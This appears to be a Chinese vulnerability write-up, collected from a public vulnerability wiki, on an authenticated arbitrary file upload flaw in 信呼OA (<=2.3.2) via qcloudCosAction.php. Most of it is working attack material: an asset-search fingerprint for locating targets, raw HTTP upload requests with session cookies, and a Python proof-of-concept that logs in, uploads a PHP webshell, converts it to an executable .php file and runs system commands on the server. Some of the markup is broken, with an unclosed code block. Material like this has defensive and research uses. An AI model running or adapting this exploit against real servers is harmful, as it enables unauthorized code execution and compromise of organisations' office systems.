---
title: "信呼OA qcloudCosAction.php 任意文件上传漏洞"
date: 2026-10-17 09:12:09
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "信呼OA"
tags:
  - "信呼OA"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

信呼 OA <=v2.3.2 版本在`webmain\task\runt\qcloudCosAction.php`云存储下调用了`qcloudCosClassAction`方法，导致文件上传漏洞。通过该漏洞，攻击者可突破上传限制，上传 php 文件获取服务器shell。

利用前提是已经获取了用户名/登陆口令。

参考链接：

- https://github.com/rainrocka/xinhu

## 漏洞影响

```
信呼OA <= 2.3.2
```

## 网络测绘

```
app="信呼协同办公系统"
```

## 漏洞复现

登陆页面：

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240124101156480.png)

登陆系统，找到上传点：

```
任务资源 → 文件传送 → 相关文件
```

上传1.php，记录filepath和id：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=769871 HTTP/1.1
Host: www.xinhu2.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type:multipart/form-data; boundary=
---------------------------40605609116060410203660967062
Content-Length: 250
Origin: http://www.xinhu2.com
Connection: close
Referer:http://www.xinhu2.com/index.php?m=upload&amp;d=public&amp;callback=&amp;upkey=20220513091317429617&amp;showid=fileidview
Cookie:deviceid=1650359786139;xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03;xinhu_ca_adminuser=admin;xinhu_ca_rempass=0;PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
-----------------------------40605609116060410203660967062
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

&lt;?php phpinfo(); ?&gt;

-----------------------------40605609116060410203660967062--</code></pre>

</details>

查看1.php是否上传成功：

```
GET /task.php?m=qcloudCos|runt&a=run&fileid=9 HTTP/1.1
Host: www.xinhu2.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: deviceid=1650359786139; xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
Upgrade-Insecure-Requests: 1
```

上传后路径：

```
http://<IP>/upload/2024-01/23_16071247.php
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
## 漏洞POC

poc.py

```python
# 1.php为webshell

# 需要修改以下内容：
# url_pre = 'http://&lt;IP&gt;/'
# 'adminuser': '&lt;ADMINUSER_BASE64&gt;',
# 'adminpass': '&lt;ADMINPASS_BASE64&gt;',

import requests

session = requests.session()
url_pre = 'http://&lt;IP&gt;/'
url1 = url_pre + '?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'
url2 = url_pre + '/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'
# url3 = url_pre + '/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': '&lt;ADMINUSER_BASE64&gt;',
    'adminpass': '&lt;ADMINPASS_BASE64&gt;',
    'yanzm': ''    
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
print(filepath)
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=&#115;ystem('dir');")
print(r.text)</code></pre>

</details>

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
